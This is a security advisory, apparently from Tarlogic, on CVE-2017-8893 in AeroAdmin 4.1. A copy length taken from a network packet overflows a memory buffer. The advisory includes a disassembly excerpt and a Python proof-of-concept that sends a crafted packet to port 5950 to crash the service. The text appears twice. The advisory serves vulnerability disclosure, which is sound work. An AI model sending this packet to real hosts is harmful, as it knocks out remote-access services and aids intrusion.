AeroAdmin 4.1 Vulnerability – CVE-2017-8893 CVE-2017-8894

# AeroAdmin 4.1 Vulnerability – CVE-2017-8893 CVE-2017-8894

01 - Mar - 2017

Tarlogic Advisory: Tarlogic-2017-001

Title: Multiple vulnerabilities found in AeroAdmin 4.1 software.

Discovered by: Juan Manuel Fernandez (@TheXC3LL)

CWE-ID: CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer

## AeroAdmin Vulnerability – CVE-2017-8893

Advisory.vulnerabilities reported by Tarlogic

AeroAdmin 4.1 uses a function to copy data between two pointers where the size of the data copied is taken directly from a network packet. This vulnerability have been reported as CVE-2017-8893.

> 005301B0 push edi
>
> 005301B1 push esi
>
> 005301B2 mov esi, ORIGEN
>
> 005301B6 mov ecx, SIZE
>
> 005301BA mov edi, DESTINO
>
> 005301BE mov eax, ecx
>
> 005301C0 mov edx, ecx
>
> 005301C2 add eax, esi
>
> 005301C4 cmp edi, esi
>
> 005301C6 jbe short loc\_005
>
> (…)
>
> 005301FE rep movsb ; Crash
>
> 00530200 mov eax, [esp+8+DESTINO]
>
> 00530204 pop esi
>
> 00530205 pop edi
>
> 00530206 retn

We can control “SIZE” variable, so the ECX register used for “rep movsb” has an arbitrary value at this point. Set a breakpoint at rep mosvb address and test it:

> #Proof of concept
>
> import socket
>
> import signal
>
> import sys
>
> target\_IP =’192.168.245.206′ #Change as needed
>
> target\_port = 5950
>
> sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
>
> server\_address = (target\_IP, target\_port)
>
> sock.connect(server\_address)
>
> packet1 = “040000000037130000”.decode(“hex”) # <– will be the value used as size (3713 –> 1337)
>
> print “[+] Sent:\n ” + packet1.encode(“hex”)
>
> sock.send(packet1)
>
> sock.close()

AeroAdmin 4.1 Vulnerability – CVE-2017-8893 CVE-2017-8894

# AeroAdmin 4.1 Vulnerability – CVE-2017-8893 CVE-2017-8894

01 - Mar - 2017

Tarlogic Advisory: Tarlogic-2017-001

Title: Multiple vulnerabilities found in AeroAdmin 4.1 software.

Discovered by: Juan Manuel Fernandez (@TheXC3LL)

CWE-ID: CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer

## AeroAdmin Vulnerability – CVE-2017-8893

Advisory.vulnerabilities reported by Tarlogic

AeroAdmin 4.1 uses a function to copy data between two pointers where the size of the data copied is taken directly from a network packet. This vulnerability have been reported as CVE-2017-8893.

> 005301B0 push edi
>
> 005301B1 push esi
>
> 005301B2 mov esi, ORIGEN
>
> 005301B6 mov ecx, SIZE
>
> 005301BA mov edi, DESTINO
>
> 005301BE mov eax, ecx
>
> 005301C0 mov edx, ecx
>
> 005301C2 add eax, esi
>
> 005301C4 cmp edi, esi
>
> 005301C6 jbe short loc\_005

> 005301FE rep movsb ; Crash

> 00530200 mov eax, [esp+8+DESTINO]
>
> 00530204 pop esi
>
> 00530205 pop edi
>
> 00530206 retn

We can control “SIZE” variable, so the ECX register used for “rep movsb” has an arbitrary value at this point. Set a breakpoint at rep mosvb address and test it:

> #Proof of concept
>
> import socket
>
> import signal
>
> import sys
>
> target\_IP =’192.168.245.206′ #Change as needed
>
> target\_port = 5950
>
> sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
>
> server\_address = (target\_IP, target\_port)
>
> sock.connect(server\_address)
>
> packet1 = “040000000037130000”.decode(“hex”) # <– will be the value used as size (3713 –> 1337)
>
> print “[+] Sent:\n ” + packet1.encode(“hex”)
>
> sock.send(packet1)
>
> sock.close()
>
> #EoF
